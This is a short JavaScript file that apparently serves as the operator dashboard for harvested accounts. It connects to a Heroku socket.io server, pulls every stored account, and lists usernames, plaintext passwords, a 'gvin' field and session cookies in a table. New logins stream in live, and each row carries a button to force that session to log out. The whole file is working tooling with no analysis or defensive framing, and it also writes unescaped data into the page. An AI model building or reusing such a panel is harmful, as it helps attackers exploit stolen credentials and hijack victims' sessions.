const socket = io("https://vin88.herokuapp.com");
socket.emit("mlog")
socket.emit("getAllAcc")
socket.on("returnAll",(datas)=>{
    console.log(datas)
    $("#main").html("");
    datas.forEach(data => {
        $("#main").append('<tr><td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" skid="'+data.socket+'" class="logout btn btn-primary">Logout</button></td></tr>');
    });
})
socket.on("loginchange",(datas)=>{
    console.log(datas)
    datas.forEach(data => {
        $("#main").append('<tr><td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" skid="'+data.socket+'"  class="logout btn btn-primary">Logout</button></td></tr>');
    });
})
function logout(sessid){
    console.log(sessid);
    socket.emit("logoutacc",sessid)
}
$(document).on('click', '.logout', function(e) {
    console.log("out");
    skid = $(this).attr("skid");
    //do whatever
    
    });
